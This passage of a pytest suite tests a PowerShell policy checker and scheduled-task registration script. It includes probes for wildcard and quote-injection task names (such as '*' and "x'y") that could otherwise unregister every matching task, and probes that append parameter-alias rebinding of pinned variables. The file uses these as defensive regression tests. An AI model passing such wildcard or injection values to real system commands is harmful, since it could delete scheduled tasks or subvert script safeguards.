    resolves commands, functions, parameters, members, types and variables
    case-insensitively, so every regression probe re-cased at random must get
    the same verdict — flagged by its intended check, not by a parse error."""
    exe = _pwsh()
    base_inv = _inventory_for(exe)
    files: list[Path] = []
    for probe_id, base, position, snippet in _REGRESSIONS:
        text = (_SCRIPTS / base).read_text(encoding="utf-8")
        mutated = _apply_edit(text, position, _random_case_edit(position, snippet, probe_id))
        target = tmp_path / probe_id / base
        target.parent.mkdir()
        target.write_bytes(mutated.encode("utf-8"))
        files.append(target)
    results = [_canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=900)]
    wrong: list[str] = []
    for (probe_id, base, _position, _snippet), entry in zip(_REGRESSIONS, results, strict=True):
        assert Path(entry["path"]).parent.name == probe_id
        inv = dict(base_inv)
        inv[base] = entry
        failed = _run_checks(base, inv)
        expected = _PROBE_EXPECTED_CHECK[probe_id]
        if expected not in failed or ("parse" in failed and "using" not in probe_id):
            wrong.append(f"{probe_id}: expected {expected!r}, raised {sorted(failed)}")
    assert not wrong, "re-cased probes changed verdict:\n" + "\n".join(wrong)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_function_bodies_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_local_function_bodies(script, inventory[script])


@pytest.mark.parametrize("name", ["*", "Gpo*", "GpoLens?", "[A-Z]*", "a\\b", "x'y", " lead"])
def test_task_name_wildcards_are_refused_before_unregister(tmp_path: Path, name: str) -> None:
    """Sol round 5 (B2): `-TaskName '*' -Unregister` reached Unregister-
    ScheduledTask and removed every matching task. The shared TaskName
    validator now refuses wildcard/path/quote characters at parameter binding,
    before ShouldProcess or the cmdlet runs (stubbed here; a valid name is the
    positive control)."""
    probe = tmp_path / "unregister.ps1"
    script = _SCRIPTS / "Register-GpoLensCollection.ps1"
    probe.write_text(
        "function Unregister-ScheduledTask { param([string]$TaskName, [switch]$Confirm)\n"
        '  "STUB_UNREGISTER <$TaskName>" }\n'
        "$Name = $args[0]\n"
        f"try {{ & '{script}' -Unregister -TaskName $Name -Confirm:$false }}\n"
        "catch { 'REFUSED ' + $_.FullyQualifiedErrorId }\n"
        f"& '{script}' -Unregister -TaskName 'GpoLensCollection' -Confirm:$false\n",
        encoding="utf-8",
    )
    result = subprocess.run(
        [_pwsh(), "-NoProfile", "-NonInteractive", "-File", str(probe), name],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    out = result.stdout
    assert "REFUSED ParameterArgumentValidationError" in out, out + result.stderr
    assert f"STUB_UNREGISTER <{name}>" not in out
    assert "STUB_UNREGISTER <GpoLensCollection>" in out  # positive control


# Aliases of the variable-writing common parameters (PowerShell's own).
_VARIABLE_PARAM_ALIASES = {
    "outvariable": "ov",
    "pipelinevariable": "pv",
    "errorvariable": "ev",
    "warningvariable": "wv",
    "informationvariable": "iv",
}


def test_variable_param_prefixes_and_aliases_are_resolved(tmp_path: Path) -> None:
    """DeepSeek round 5 (BL-1): `-Pi` is the unambiguous 2-char prefix of
    -PipelineVariable. The dumper resolves every parameter token the way
    PowerShell does, so the full name, each alias, and every unambiguous prefix
    of a variable-writing common parameter must all be caught rebinding a pinned
    root. Each token is run through the real dumper (its resolver is pwsh's)."""
    exe = _pwsh()
    base = (_SCRIPTS / "Export-GpoEstate.ps1").read_text(encoding="utf-8")
    forms: dict[str, tuple[str, str]] = {}  # label -> (token, expected canonical)
    for name in _VARIABLE_WRITING_PARAMS:
        canon = name.casefold()
        forms[f"{name}:full"] = (name, canon)
        forms[f"{name}:alias"] = (_VARIABLE_PARAM_ALIASES[canon], canon)
        for i in range(2, len(name) + 1):  # prefixes; the dumper reports which resolve
            forms[f"{name}:pre{i}"] = (name[:i], canon)
    files: list[Path] = []
    labels = list(forms)
    for label in labels:
        token, _canon = forms[label]
        target = tmp_path / f"{label.replace(':', '_')}.ps1"
        target.write_text(
            base + f"\nGet-Item -LiteralPath '/etc/hostname' -{token} OutputRoot | Out-Null\n",
            encoding="utf-8",
        )
        files.append(target)
    results = [_canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=900)]
    caught_pi_prefix = False
    for label, entry in zip(labels, results, strict=True):
        token, expected = forms[label]
        appended = next(
            c
            for c in reversed(entry["commands"])
            if any(_norm(a["value"]) == "'/etc/hostname'" for a in c["arguments"])
        )
        arg = next(
            a for a in appended["arguments"] if a["parameter"] and _norm(a["value"]) == "OutputRoot"
        )
        canon = arg.get("parameter_canonical")
        if canon != expected:
            continue  # this prefix is ambiguous on Get-Item; PowerShell would not bind it either
        inv = dict(_inventory_for(exe))
        inv["Export-GpoEstate.ps1"] = entry
        failed = _run_checks("Export-GpoEstate.ps1", inv)
        assert "pinned_bindings" in failed, (
            f"{label} (-{token} -> {canon}) was not rejected: {sorted(failed)}"
        )
        if token.casefold() == "pi":
            caught_pi_prefix = True
    assert caught_pi_prefix, "the 2-char prefix -Pi of -PipelineVariable was not exercised"


def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
    for script in POLICIES:
        run_all_checks(script, inventory)
